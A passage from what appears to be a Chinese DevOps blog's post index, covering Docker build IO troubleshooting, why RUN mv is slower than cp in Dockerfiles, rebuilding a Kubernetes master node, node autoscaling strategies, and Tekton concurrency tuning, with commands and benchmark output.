时，遇到 Run 命令会启动一个容器运行，然后提交镜像。从测试结果，可以看到 Dockerfile 中的 IO 速度远达不到主机的，与容器中的 IO 速度一致；主机存储卷的 IO 速度与主机的 IO 速度一致。\n7. 直接使用 buildkitd 构建效果不佳 虽然可以通过 DOCKER_BUILDKIT=1 开启 Buildkit 构建，但如果直接使用 buildkitd 效果不错，用于替换 Dockerd 构建也是一个不错的选择。\n7.1 安装 buildkit 1 2 3 wget https://github.com/moby/buildkit/releases/download/v0.11.2/buildkit-v0.11.2.linux-amd64.tar.gz tar xvf buildkit-v0.11.2.linux-amd64.tar.gz mv bin/* /usr/local/bin/ 7.2 部署 buildkitd 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 cat \u0026gt; /usr/lib/systemd/system/buildkitd.service \u0026lt;\u0026lt;EOF [Unit] Description=/usr/local/bin/buildkitd ConditionPathExists=/usr/local/bin/buildkitd After=containerd.service [Service] Type=simple ExecStart=/usr/local/bin/buildkitd User=root Restart=on-failure RestartSec=1500ms [Install] WantedBy=multi-user.target EOF 1 2 3 4 systemctl daemon-reload systemctl restart buildkitd systemctl enable buildkitd systemctl status buildkitd 查看到 buildkitd 正常运行即可。\n7.3 测试 buildctl 提交构建 1 2 3 buildctl build --frontend=dockerfile.v0 --local context=. --local dockerfile=. --no-cache --output type=docker,name=test:v4 | docker load [+] Building 240.8s (7/7) FINISHED 使用 buildctl 提交给 buildkitd 进行构建，需要的时间更多，达到 4min，较之前增加一倍。\n8. 当前存储驱动下读写镜像有瓶颈 8.1 查看 Dockerd 处理逻辑 在代码 https://github.com/moby/moby/blob/8d193d81af9cbbe800475d4bb8c529d67a6d8f14/builder/dockerfile/dispatchers.go 可以找到处理 Dockerfile 的逻辑。\n1，Add 和 Copy 都是调用 performCopy 函数\n2，performCopy 中调用 NewRWLayer() 新建层，调用 exportImage 写入数据\n因此，怀疑的是 Dockerd 写镜像层速度慢。\n8.2 测试镜像层写入速度 准备一个镜像，大小 16GB，一共 18 层。\n导入镜像 1 2 3 time docker load \u0026lt; /tmp/16GB.tar real 2m43.288s 保存镜像 1 2 3 time docker save 0d08de176b9f \u0026gt; /tmp/16GB.tar real 2m48.497s docker load 和 docker save 速度差不多，对镜像层的处理速度大约为 100 MB/s。这个速度比磁盘 4K 随机写速度少了近 30%。在我看来，如果是个人使用勉强接受；如果用于对外提供构建服务的平台产品，这块磁盘显然是不合适的。\n8.3 存储驱动怎么选 下面是从 https://docs.docker.com/storage/storagedriver/select-storage-driver/ 整理得出的一个比较表格:\n存储驱动 文件系统要求 高频写入性能 稳定性 其他 overlay2 xfs、ext4 差 好 当前首选 fuse-overlayfs 无限制 - - 适用 rootless 场景 btrfs btrfs 好 - - zfs zfs 好 - - vfs 无限制 - - 不建议生产 aufs xfs、ext4 - 好 Docker 18.06 及之前版本首选，不维护 devicemapper direct-lvm 好 好 不维护 overlay xfs、ext4 差，但好于 overlay2 - 不维护 排除不维护和非生产适用的，可选项其实没几个。正好有一台机器，前段时间初始化时，将磁盘格式化成 Btrfs 文件格式，可以用于测试。zfs 存储驱动推荐用于高密度 PaaS 系统。\n8.4 测试 Btrfs 存储驱动 在主机上 1 2 Rand_Write_Testing: (groupid=0, jobs=1): err= 0 write: IOPS=40.0k, BW=160MiB/s (168MB/s)(3072MiB/19191msec); 0 zone resets 容器下的测试命令 运行容器\n1 docker run -it hubimage/demo-fio bash 执行测试\n1 fio -direct=1 -iodepth=128 -rw=randwrite -ioengine=libaio -bs=4k -size=3G -numjobs=1 -runtime=1000 -group_reporting -filename=/data/test.file --allow_mounted_write=1 -name=Rand_Write_Testing 测试 overlay2 存储驱动 1 2 3 4 5 docker info Server Version: 20.10.12 Storage Driver: overlay2 Backing Filesystem: btrfs 1 2 Rand_Write_Testing: (groupid=0, jobs=1): err= 0: pid=78: Thu Feb 2 02:41:48 2023 write: IOPS=21.5k, BW=84.1MiB/s (88.2MB/s)(3072MiB/36512msec); 0 zone resets 测试 btrfs 存储驱动 1 2 3 4 5 docker info Server Version: 20.10.12 Storage Driver: btrfs Build Version: Btrfs v5.4.1 1 2 Rand_Write_Testing: (groupid=0, jobs=1): err= 0 write: IOPS=39.8k, BW=156MiB/s (163MB/s)(3072MiB/19750msec); 0 zone resets 可以明显看到 btrfs 存储驱动在速度上优于 overlay2。\n9. 总结 本篇主要是记录在生产环境下碰到的 Dockerfile 构建 IO 慢问题排查过程。\n通过设计各种测试案例排查问题，对各个要素进行一一验证，需要极大耐心，也特别容易走错方向，得出错误结论。\n本篇主要观点如下:\ncompress、stream 参数对构建速度不一定有效 减少构建上下文大小，有利于缓解构建 IO 压力 Buildkit 的缓存可以不用频繁清理 构建 Dockerfile 执行命令时，CPU、Mem 不会受到限制，但 IO 速度慢 使用 buildkitd 构建速度不如 Dockerd 开启 DOCKER_BUILDKIT 使用 Btrfs 存储有利于获得更好的 IO 速度 但最简单的还是使用 4K 随机读写快的磁盘，在拿到新的环境用于生产之前，务必先进行测试，仅当满足需求时，再执行后续计划。\n10. 参考 https://docs.docker.com/engine/reference/commandline/build/ https://docs.docker.com/build/install-buildx/ https://flyer103.com/2022/08/20220806-buildkitd-usage/ https://pepa.holla.cz/2019/11/18/how-build-own-docker-image-in-golang/ ","description":"","id":129,"section":"post","tags":["博文","Docker","镜像","CICD","构建"],"title":"排查构建镜像时 IO 慢问题","uri":"https://www.chenshaowen.com/blog/troubleshoot-slow-io-when-building-dockerfile.html"},{"content":" 不同于 CentOS、Ubuntu，我们感受到 mv 比 cp 快；在使用 Dockerfile 构建镜像时，使用 Run cp 会比 Run mv 更快。本篇将给出相关的一些测试、验证的数据结果。\n1. 测试准备 机器环境 Ubuntu 20.04.1 LTS\n32C\n125Gi\n由于是生产机器，上面会有些负载，因此测试会有偏差。我会多次测试，等结果稳定时取样。\n文件结构 1 2 3 ls main lib i100 cc 文件大小 1 2 3 4 5 6 7 du -h --max-depth=1 2.7M ./i100 47M ./main 808K ./cc 424M ./lib 474M . 文件及目录总数 1 2 3 ls -lR| wc -l 42978 2. 使用 Run mv 命令构建 Dockerfile 内容\n1 2 3 4 5 6 7 FROM golang:1.13 COPY ./ /go/src/code RUN mkdir /a \u0026amp;\u0026amp; mv /go/src/code/cc/* /a/ \\ \u0026amp;\u0026amp; mkdir /b \u0026amp;\u0026amp; mv /go/src/code/lib/* /b/ \\ \u0026amp;\u0026amp; mkdir /c \u0026amp;\u0026amp; mv /go/src/code/i100/resource/* /c/ \\ \u0026amp;\u0026amp; mkdir /d \u0026amp;\u0026amp; mv /go/src/code/main/* /d/ 构建镜像\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 DOCKER_BUILDKIT=1 docker build --no-cache -t test:v1 -f ./Dockerfile1 . [+] Building 78.0s (8/8) FINISHED =\u0026gt; [internal] load build definition from Dockerfile1 0.0s =\u0026gt; =\u0026gt; transferring dockerfile: 334B 0.0s =\u0026gt; [internal] load .dockerignore 0.0s =\u0026gt; =\u0026gt; transferring context: 2B 0.0s =\u0026gt; [internal] load metadata for golang:1.13 0.0s =\u0026gt; CACHED [1/3] FROM golang:1.13 0.0s =\u0026gt; [internal] load build context 2.0s =\u0026gt; =\u0026gt; transferring context: 3.05MB 1.9s =\u0026gt; [2/3] COPY ./ /go/src/code 4.7s =\u0026gt; [3/3] RUN mkdir /a \u0026amp;\u0026amp; mv /go/src/code/cc/* /a/ \u0026amp;\u0026amp; mkdir /b \u0026amp;\u0026amp; mv /go/src/code/lib/* /b/ \u0026amp;\u0026amp; mkdir /c \u0026amp;\u0026amp; mv /go/src/code/i100/resource/* /c/ \u0026amp;\u0026amp; mkdir /d \u0026amp;\u0026amp; mv /go/src/code/main/* /d/ 57.6s =\u0026gt; exporting to image 13.6s =\u0026gt; =\u0026gt; exporting layers 13.6s =\u0026gt; =\u0026gt; writing image sha256:973b97d407a6403132d279f2c8ac713268ada69fe067e355700efa650ff65d8b 0.0s =\u0026gt; =\u0026gt; naming to docker.io/library/test:v1 0.0s Run mv 使用了 57.6s。\n3. 使用 Run cp 命令构建 Dockerfile 内容\n1 2 3 4 5 6 7 FROM golang:1.13 COPY ./ /go/src/code RUN mkdir /a \u0026amp;\u0026amp; cp -R /go/src/code/cc/* /a/ \\ \u0026amp;\u0026amp; mkdir /b \u0026amp;\u0026amp; cp -R /go/src/code/lib/* /b/ \\ \u0026amp;\u0026amp; mkdir /c \u0026amp;\u0026amp; cp -R /go/src/code/i100/resource/* /c/ \\ \u0026amp;\u0026amp; mkdir /d \u0026amp;\u0026amp; cp -R /go/src/code/main/* /d/ 构建镜像\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 DOCKER_BUILDKIT=1 docker build --no-cache -t test:v1 -f ./Dockerfile2 . [+] Building 26.2s (8/8) FINISHED =\u0026gt; [internal] load build definition from Dockerfile2 0.0s =\u0026gt; =\u0026gt; transferring dockerfile: 282B 0.0s =\u0026gt; [internal] load .dockerignore 0.0s =\u0026gt; =\u0026gt; transferring context: 2B 0.0s =\u0026gt; [internal] load metadata for golang:1.13 0.0s =\u0026gt; [internal] load build context 2.0s =\u0026gt; =\u0026gt; transferring context: 3.05MB 2.0s =\u0026gt; CACHED [1/3] FROM golang:1.13 0.0s =\u0026gt; [2/3] COPY ./ /go/src/code 5.4s =\u0026gt; [3/3] RUN cp -R /go/src/code/cc / \u0026amp;\u0026amp; cp -R /go/src/code/lib / \u0026amp;\u0026amp; cp -R /go/src/code/i100/resource / \u0026amp;\u0026amp; cp -R /go/src/code/main / 5.1s =\u0026gt; exporting to image 13.5s =\u0026gt; =\u0026gt; exporting layers 13.4s =\u0026gt; =\u0026gt; writing image sha256:bd3c53ac40006a79ec009b6112fdcfec85e0adef6d0fcf6aa65d3ee02b2e202a 0.0s =\u0026gt; =\u0026gt; naming to docker.io/library/test:v1 0.0s Run cp 使用了 5.1s。\n4. 使用 strace 追踪 mv 和 cp 命令 上面没有给出大量测试之后的统计值，但多次执行能稳定复现，在相同工程下 RUN cp 命令比 RUN mv 命令镜像构建效率高很多。\nUbuntu 上，如果源文件和目标文件在同一个文件系统上 mv 命令会先尝试调用 rename 快速移动，在失败之后，才会采用 cp 模式的复制。下面是使用 strace 跟踪到的系统部分系统调用。\n1 2 3 4 5 6 7 8 strace cp -R main main1 read(3, \u0026#34;# -*- coding: utf-8 -*-\\n\\n\\\u0026#34;\\\u0026#34;\\\u0026#34;\\n@ve\u0026#34;..., 131072) = 8425 write(4, \u0026#34;# -*- coding: utf-8 -*-\\n\\n\\\u0026#34;\\\u0026#34;\\\u0026#34;\\n@ve\u0026#34;..., 8425) = 8425 mkdir(\u0026#34;main1/scripts/update_oauth\u0026#34;, 0755) = 0 lstat(\u0026#34;main1/scripts/update_oauth\u0026#34;, {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0 openat(AT_FDCWD, \u0026#34;main/scripts/update_oauth\u0026#34;, O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 3 fstat(3, {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0 1 2 3 4 5 strace mv main1 main2 ioctl(0, TCGETS, {B9600 opost isig icanon echo ...}) = 0 renameat2(AT_FDCWD, \u0026#34;main1\u0026#34;, AT_FDCWD, \u0026#34;main2\u0026#34;, RENAME_NOREPLACE) = 0 lseek(0, 0, SEEK_CUR) = -1 ESPIPE (Illegal seek) 可以看到 mv 直接调用了 renameat2，跳过了复制文件的操作。\nUbuntu 上，如果源文件和目标文件不在同一个文件系统上 此时，mv 命令不仅需要复制文件，还需要 unlink 删除文件，比 cp 多一个步骤。如果文件很多，那么 unlink 将非常耗时。\n/data 挂载了另外一个硬盘\n1 2 3 4 5 strace cp -R main /data/main1 lstat(\u0026#34;main/upgrade/1.0.1/README.MD\u0026#34;, {st_mode=S_IFREG|0644, st_size=1599, ...}) = 0 openat(AT_FDCWD, \u0026#34;main/upgrade/1.0.1/README.MD\u0026#34;, O_RDONLY|O_NOFOLLOW) = 3 fstat(3, {st_mode=S_IFREG|0644, st_size=1599, ...}) = 0 1 2 3 4 5 6 7 strace mv main /data/main2 renameat2(AT_FDCWD, \u0026#34;main/upgrade/1.0.7/README.MD\u0026#34;, AT_FDCWD, \u0026#34;/data/main2/upgrade/1.0.7/README.MD\u0026#34;, RENAME_NOREPLACE) = -1 EXDEV (Invalid cross-device link) lstat(\u0026#34;main/upgrade/1.0.7/README.MD\u0026#34;, {st_mode=S_IFREG|0644, st_size=1280, ...}) = 0 newfstatat(AT_FDCWD, \u0026#34;/data/main2/upgrade/1.0.7/README.MD\u0026#34;, 0x7fff09ac3810, AT_SYMLINK_NOFOLLOW) = -1 ENOENT (No such file or directory) unlink(\u0026#34;/data/main2/upgrade/1.0.7/README.MD\u0026#34;) = -1 ENOENT (No such file or directory) mv 尝试 rename，但是失败，只能进入 cp 模式。\n在 Dockerfile 中的 Run mv 命令 由于上面的基础镜像没有 strace 命令，这里在 test:v1 镜像的基础上，安装 strace 重新提交，具体步骤略过。\nDockerfile 内容\n1 2 3 4 5 6 FROM test:v1 RUN strace mv /a /a1 \\ \u0026amp;\u0026amp; strace mv /b /b1 \\ \u0026amp;\u0026amp; strace mv /c /c1 \\ \u0026amp;\u0026amp; strace mv /d /d1 构建镜像\n1 2 3 4 5 6 DOCKER_BUILDKIT=1 docker build --no-cache -t test:v2 -f ./Dockerfile . --progress=plain #5 0.435 renameat2(AT_FDCWD, \u0026#34;/a\u0026#34;, AT_FDCWD, \u0026#34;/a1\u0026#34;, RENAME_NOREPLACE) = -1 EXDEV (Invalid cross-device link) #5 0.436 newfstatat(AT_FDCWD, \u0026#34;/a/CHANGES.txt\u0026#34;, {st_mode=S_IFREG|0644, st_size=435, ...}, AT_SYMLINK_NOFOLLOW) = 0 #5 0.436 newfstatat(AT_FDCWD, \u0026#34;/a1/CHANGES.txt\u0026#34;, 0x7ffeb191e6d0, AT_SYMLINK_NOFOLLOW) = -1 ENOENT (No such file or directory) #5 0.436 unlink(\u0026#34;/a1/CHANGES.txt\u0026#34;) = -1 ENOENT (No such file or directory) Invalid cross-device link 说明，Dockerfile 中的 Run mv 调用 rename 并不能成功。也就是说 Dockerfile 中的 Run mv = Run cp + Run unlink\n5. 总结 由于在生产的 CICD 系统中，有些流水线构建时执行 Run mv 很慢，找不到原因。本篇主要是分析这一问题，并给出解，可以通过 Run cp 替代 Run mv。对于文件数比较大的构建项目，会有显著加速效果。如果文件数较少，可以忽略这一优化。具体结论如下:\n在同一个文件系统下，mv 比 cp 快 在不同文件系统下，cp 比 mv 快 在 Dockerfile 中，Run cp 比 mv 快，上面的例子从 57s 降到了 5s 那么问题来了，Docker Daemon 是怎么处理 Dockerfile 的？其他工具，例如 Kaniko 等会不会有类似问题？为什么 Dockerfile 中的 unlink 比主机上的 unlink 操作更费时？\n在这个案例下，第二种优化是，使用 Copy、Add 命令替代 Run mv，避免在 Dockerfile 中执行 Run 进行文件的操作；第三种优化是，一个项目很难达到 4w 文件数，可以通过 .dockerignore 忽略用不上的文件传入 context，例如 .git、node_modules、vendor、.m2 等，以减少 unlink 时间。\n6. 参考 https://unix.stackexchange.com/questions/277412/cp-vs-mv-which-operation-is-more-efficient ","description":"","id":130,"section":"post","tags":["博文","Docker","容器","CICD"],"title":"Dockerfile 中 Run mv 比 cp 慢","uri":"https://www.chenshaowen.com/blog/run-mv-is-slower-than-cp-in-dockerfile.html"},{"content":"最近碰到两次，因故障需要重装主机系统。其中一次 Etcd 只剩下一个节点，导致整个集群宕机半个小时才恢复。本篇主要记录的是新系统 Ubuntu 20.04 初始化的过程，完成初始化之后采用优秀的集群安装工具 Kubekey 的 add nodes 命令，无需修改配置文件，一键就将节点重新加入了集群。\n1. 恢复 Etcd 三个节点的 Etcd 集群，只有一个节点运行是无法工作的。因此，务必首先修复 Etcd 集群。这里比较幸运的是，系统重装之后 Ip 没有发生变化，否则需要重新生成证书，具体操作见另外一篇博文，《如何修复变更 IP 之后的 Kubernetes 集群》。\n在重装节点上，拷贝其他节点的 Etcd 二进制文件、配置文件、启动文件 1 2 3 4 scp etcd-node1:/usr/local/bin/etcd /usr/local/bin/ scp etcd-node1:/etc/etcd.env /etc/ scp etcd-node1:/etc/systemd/system/etcd.service /etc/systemd/system/ scp -r etcd-node1:/etc/ssl/etcd /etc/ssl/ 通常，一个 Etcd 集群的所有节点启动方式一样，只需要完全拷贝另外一个节点的即可。\n在重装节点上，编辑配置文件，替换主机信息 1 vim /etc/etcd.env 这里需要替换的主要是 IP、NodeName 信息，将这些信息替换为当前节点的即可。因为这些会涉及到证书、Etcd WAL 数据中的节点信息数据的有效性。保持与之前一样，有助于快速恢复 Etcd 集群。\n启动 Etcd 1 systemctl start etcd 设置开机启动 Etcd 1 systemctl enable etcd 三个节点的 Etcd 有两个能运行，集群就能正常工作。剩下的就是初始化节点，并将节点重新添加到集群。这里有些特殊的是集群主要用于持续集成，需要挂载一块额外的存储盘，安装指定的 Docker 版本。\n2. 初始化数据盘并格式化 安装 SSD 盘驱动 由于采用的是宝存企业级 SSD，还需要安装驱动。根据提供的文档，安装驱动有两种安装方式，一种是 deb 安装，另一种是编译安装。但是提供的 deb 版本没有匹配上 Ubuntu 20.04，而编译安装有奇怪报错无法解决。\n可行的安装方式是，先编译生成 deb 驱动包，再安装 deb 驱动包。宝存的 SSD 下面会给出一个测速以供参考。\n查看磁盘 安装完成 SSD 驱动之后，操作系统就能识别到磁盘了。\n1 2 3 4 5 6 7 lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 558.4G 0 disk ├─sda1 8:1 0 1M 0 part └─sda2 8:2 0 558.4G 0 part / dfa 252:0 0 2.9T 0 disk 其中的 /dev/dfa 就是额外的 SSD 数据盘。\n使用 parted 创建 GPT 分区表 由于硬盘超过了 2TB，fdisk 无法处理，需要使用 parted\n1 parted /dev/dfa 1 mklabel gpt 格式化分区为 btrfs 1 mkfs.btrfs /dev/dfa 挂载分区到 /data 目录 1 2 mkdir /data mount /dev/dfa /data 修改 /etc/fstab 开启自动挂载磁盘 新增如下内容:\n1 /dev/dfa /data btrfs defaults 0 0 修改完成之后，一定要测试以下步骤，否则可能无法开机。\n卸载 /data 挂载的设备 1 umount /data 自动挂载设备 1 mount -a 查看是否成功自动挂载 1 df -h 使用 fio 测试随机读写速度 1 2 3 4 4K 随机写: (groupid=0, jobs=1) write: IOPS=78.2k, BW=306MiB/s (320MB/s)(3072MiB/10051msec) 4K 随机读: (groupid=0, jobs=1) read: IOPS=120k, BW=468MiB/s (490MB/s)(3072MiB/6571msec) 3. 设置软链接指向数据盘 Docker 1 2 3 mkdir /data/docker ln -s /data/docker /var/lib/docker ls -al /var/lib/docker Kubelet 1 2 3 mkdir /data/kubelet ln -s /data/kubelet /var/lib/kubelet ls -al /var/lib/kubelet Openebs 1 2 3 mkdir /data/openebs ln -s /data/openebs /var/openebs ls -al /var/openebs 4. 安装指定版本 Docker 卸载 Docker 1 apt-get autoremove docker docker-ce docker-engine docker.io containerd runc 添加 Docker 源 1 2 curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add - add-apt-repository \u0026#34;deb [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable\u0026#34; 更新系统源 1 apt-get update 查看 Docker 版本 1 2 3 4 apt-cache madison docker-ce docker-ce | 5:20.10.22~3-0~ubuntu-focal | https://mirrors.aliyun.com/docker-ce/linux/ubuntu focal/stable amd64 Packages docker-ce | 5:20.10.12~3-0~ubuntu-focal | https://mirrors.aliyun.com/docker-ce/linux/ubuntu focal/stable amd64 Packages 安装指定版本 1 apt-get install docker-ce=5:20.10.12~3-0~ubuntu-focal 至此，新系统初始化完成，剩下的交给 Kubekey，由于 IP 未变，可以直接使用安装时的配置文件一键添加 Master 节点到集群。\n1 sudo ./kk add nodes -f config.yaml ","description":"","id":131,"section":"post","tags":["博文","Kubernetes","修复","运维"],"title":"如何修复重装系统后的 Kubernetes Master 节点","uri":"https://www.chenshaowen.com/blog/how-to-repair-k8s-master-after-reinstalling-os.html"},{"content":"弹性伸缩主要有三个维度：\nHPA，根据利用率，自动伸缩 Pod 数量 VPA，根据历史数据，自动设置 Pod 的 Request、Limit CA，根据使用率，自动伸缩 Node 数量 本篇主要讨论的是节点扩缩容部分。\n1. 自动扩缩容组件 autoscaler autoscaler 是 Kubernetes 社区维护的项目。目前 autoscaler 组件已经提供有 VPA、CA 的伸缩能力。EKS、CCE、ACK、TKE 等主流厂商，都是依赖此组件进行 CA 弹性扩容。没有找到官方数据，但和同事交流时反馈，大约都需要 2-3 分钟完成 CA 扩容。\n1.1 VPA 垂直扩缩容 与 HPA 类似，需要为 Deployment 创建一个 VPA 对象。\n1 2 3 4 5 6 7 8 9 10 11 apiVersion: autoscaling.k8s.io/v1 kind: VerticalPodAutoscaler metadata: name: my-app-vpa spec: targetRef: apiVersion: \u0026#34;apps/v1\u0026#34; kind: Deployment name: my-app updatePolicy: updateMode: \u0026#34;Auto\u0026#34; VPA 与 HPA 都依赖于 Metrics-server 获取监控指标数据。autoscaler 的 VPA 内置了多种资源设置推荐器，同时对资源设置也可以进行约束。\n值得注意的是 VPA 设置的资源值可能会超过命名空间下 limit ranges 的约束。\n另外，VPA 与 HPA 不要一起使用。这两种方式有冲突，Pod 数量水平扩缩容和 Pod Limit 垂直扩缩容可能被同时触发。\n1.2 CA 节点扩缩容 触发条件:\n扩容，节点无法满足 Pod Request 要求而处于 Pending 状态 缩容，节点低负载，并且节点上的 Pod 能移到其他节点 支持厂商:\nalicloud aws azure baiducloud gce huaweicloud linode tencentcloud \u0026hellip; 很多厂商都提供 Provider 给组件，AutoScaler 采用定期检测的方式，触发厂商扩缩容的接口动作。\n另外，CA 与厂商提供的 Node 垂直扩缩容不能同时使用。水平伸缩和垂直伸缩，需要找到一个平衡点，才能协同工作。\n2. 云厂托管集群的弹性伸缩 EKS、CCE、ACK、TKE 无一例外都是采用 autoscaler 组件结合自身 IaaS 服务实现节点的弹性伸缩。\n由于底层都是采用 autoscaler 组件，在产品层面的呈现也会有所体现。以 EKS 为例，如下图:\nEKS 集群，具有若干节点组，每个节点组构成一个弹性伸缩的单元。如下图，节点组最少有 1 个节点，最多有 7 个节点:\nEKS 的节点弹性是针对节点组的，同一个节点组下的节点具有相同的机器配置、污点、标签、主机启动模板。当 EKS 判断需要进行节点扩容时，会结合节点组允许的最大节点数，进行扩容。这样也保障扩容出来的节点已经打上正确的污点和标签，能够直接被 Kubernetes 调度器使用。\n另外，节点组的概念，在产品和使用层面还可以包装成超级节点。只要节点数量的上限足够大，一个节点组就能提供超大的计算和内存资源池。\n3. 节点储备策略 根据使用云厂的程度，可以将集群分为三类:\n完全托管，无法直接管理集群内的任一主机，只能使用 半托管，无法管理 master 节点，云厂维护控制面 非托管，基于云厂 IaaS 自己部署的集群，完全自主控制 完全托管的集群，云厂会提供扩缩容的功能。下面主要讨论的是半托管和非托管的集群。\n3.1 冷备 需要新节点时，再申请全新机器，初始化配置。\n优势:\n成本低，按需申请新节点 适配性好，不用考虑集群版本，按需安装依赖 操作简单，使用安装工具提供的能力，通常能够顺利完整扩容 不用考虑可用区、防火墙等问题 缺点:\n速度慢，通常得 10 分钟以上，如果依赖源慢，可能需要更长时间 无法标准化，维护的集群不是使用一个工具安装的，或者需要自行封装 Kubeadm 3.2 热备 创建一个热资源池，保持一定的资源数。当需要主机资源时，直接添加到集群。\n优势:\n速度快 缺点:\n成本高，每个集群版本都需要储备节点，1.16、1.20、1.21 等 热备池复杂，不同 IDC、不同 Region、不同 AZ 的节点，网络、防火墙可能不通，导致热备池复杂化 3.3 半热备 创建一个区域化的热备池，开启机器，仅安装 containerd、chrony、conntrack 等基础依赖包，但不要安装 Kubelet 等与集群版本相关的依赖。同时，提前放开储备区域对资源池的防火墙，还需要一个控制器维护热备池的主机数量。\n优点:\n成本、效率折中 缺点:\n防火墙会比较开放，可能引入安全问题。如果考虑安全问题，成本又上升了 4. 参考 https://github.com/kubernetes/autoscaler https://docs.aws.amazon.com/zh_cn/eks/latest/userguide/autoscaling.html https://support.huaweicloud.com/productdesc-cce/cce_productdesc_0015.html https://help.aliyun.com/document_detail/119099.html https://cloud.tencent.com/document/product/457/43719 ","description":"","id":132,"section":"post","tags":["博文","集群","弹性","节点"],"title":"集群节点的弹性扩缩","uri":"https://www.chenshaowen.com/blog/auto-add-or-remove-nodes-incluster.html"},{"content":"1. 测试目的 调优构建集群的参数 探测 Tekton 并发流水线数量上限 给出单个集群最佳并发上限值 2. 相关组件及机器配置 Kubernetes 版本 v1.21.4\nTekton 版本 v0.24.1，与生产版本保持一致\nOpenEBS 版本 localpv 版本 3.3.0，与生产版本保持一致\n集群节点配置，共五个节点，四个用于构建 node1 master，禁止调度 32C/125GB/4T SSD\nnode2 master，worker 40C/125GB/4T SSD\nnode3 master，worker 32C/125GB/4T SSD\nnode4 worker 40C/125GB/4T SSD\nnode5 worker 40C/125GB/4T SSD\n3. 集群参数调优 测试的过程，其实也是不断调试各个组件参数的过程。因此整个测试过程中的参数是动态的，当我发现瓶颈时，就会去调整参数，然后再次执行测试用例。\n3.1 kube-apiserver \u0026ndash;max-mutating-requests-inflight 调整为2000，默认值200\n\u0026ndash;max-requests-inflight 调整为 4000, 默认值为 400\n放开组件的流量控制。\n3.2 kube-controller-manager \u0026ndash;kube-api-qps 调整为 200，默认值为 20\n\u0026ndash;kube-api-burst 调整为 300，默认值为 30\n放开组件的流量控制。\n3.3 kube-scheduler-manager percentageOfNodesToScore 节点少，无需调整。\n通常需要保持 percentageOfNodesToScore * 总节点数 \u0026lt; 50\n\u0026ndash;kube-api-qps 调整为 500，默认值为 50\n\u0026ndash;kube-api-burst 调整为 1000，默认值为 100\n放开组件的流量控制。\n3.4 kubelet –max-pods 调整为 1000，默认 110\n节点数量少，配置高，单个节点的 Pod 密度会很大。\n3.5 tekton controller -kube-api-qps 调整为 200，默认值 5\n-kube-api-burst 调整为 500，默认值 10\n-threads-per-controller 调整为 100，默认值 2\nTekton Controller 采用单副本，多副本选主之后，还是单副本工作。多副本能提供更好的可用性，生产环境建议适当使用。\n3.6 tekton webhook 副本上限调整为 20，默认值 5\n1 kubectl -n tekton-pipelines edit hpa tekton-pipelines-webhook webhook 主要用于校验提交的数据，足够的副本能缩短创建流水线接口校验数据的响应时间。\n3.7 etcd \u0026ndash;quota-backend-bytes 调整为 8589934592 (8G)，默认是 2G\n放置 Pod、流水线太多，Etcd 存储不够。\n3.8 docker 20.10.8 升级到 20.10.12 这个升级极其重要，因为构建时通常会挂载主机的 Docker socket，但是 Nodejs 类构建进行系统调用时会报错。错误信息如下:\n1 2 3 4 5 6 7 8 \u001b[0m\u001b[91m 3: 0xb6fb7e [node] \u001b[0m\u001b[91m 4: 0xb6fc46 node::NodePlatform::NodePlatform(int, v8::TracingController*) [node] \u001b[0m\u001b[91m 5: 0xac7d64 node::InitializeOncePerProcess(int, char**, node::InitializationSettingsFlags, node::ProcessFlags::Flags) [node] \u001b[0m\u001b[91m 6: 0xac8949 node::Start(int, char**) [node] \u001b[0m\u001b[91m 7: 0x7f01da493d90 [/lib/x86_64-linux-gnu/libc.so.6] 8: 0x7f01da493e40 __libc_start_main [/lib/x86_64-linux-gnu/libc.so.6] \u001b[0m\u001b[91m 9: 0xa3d03c [node] \u001b[0m\u001b[91mAborted (core dumped) 此时，如果是运行镜像，很简单加上 --security-opt seccomp=unconfined，但 docker build 不支持该参数。集群已经安装 20.10.8，只能将 20.10.12 版本的 docker、dockerd、docker-init、docker-proxy 拷贝覆盖旧版本，重启机器即可。\nDocker 20.10.12 比较于 20.10.8 在安全上可能有较大调整。\n4. 其他情况说明 开启了 Tekton Metrics 采集 获取 Tekton 内部的一些指标，运行数量等。\nkube-state-metrics 开启了 label 、annotation 采集 很费资源，但能拿到很多元数据用于 Grafana 绘图。\n开启以上采集方法，可以参考之前的文章。\n5. 容量预估 CPU、内存资源 整个集群可用资源约为 152C 550GB，减去空载时，基础组件消耗，大约有 149C 535 GB。\n提前执行了一下测试流水线，CPU 约消耗几乎为 0，MEM 约消耗为 180 MB。\n按此估算，集群能提供 535 * 1024/ 180 \u0026gt; 3000 \u0026raquo; 1000 条的流水线并发执行容量。\nPod 数量 Kubelet Pod 数量限制放开到 1000，总容量达到 4000 个 Pod\n测试流水线，每条占用 4 个 Pod，一个 affinity-assistant + 三个 Pod (一共三个 Task)。\n4000 个 Pod 减去系统组件之后不足，但 Pod 数量其实可以超过 Kubelet 的设置，因此也足以支撑 1000 条流水线并发执行。\n6. 测试用例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 apiVersion: tekton.dev/v1beta1 kind: Pipeline metadata: name: testing-p namespace: test spec: params: tasks: - name: echo-1 params: - name: script value: cnt1=1; while [[ $cnt1 -lt 60 ]]; do echo \u0026#34;1111111111\u0026#34;; sleep 1; cnt1=$(($cnt1+1)); done taskRef: kind: ClusterTask name: script - name: echo-2 params: - name: script value: cnt1=1; while [[ $cnt1 -lt 60 ]]; do echo \u0026#34;2222222222\u0026#34;; sleep 1; cnt1=$(($cnt1+1)); done taskRef: kind: ClusterTask name: script runAfter: - echo-1 - name: echo-3 params: - name: script value: cnt1=1; while [[ $cnt1 -lt 60 ]]; do echo \u0026#34;3333333333\u0026#34;; sleep 1; cnt1=$(($cnt1+1)); done taskRef: kind: ClusterTask name: script runAfter: - echo-2 这里选择这条流水线的原因在于:\n生产环境的构建平均时长大约在 3m，通常 2-3 个 task 主要想测试的是 Tekton 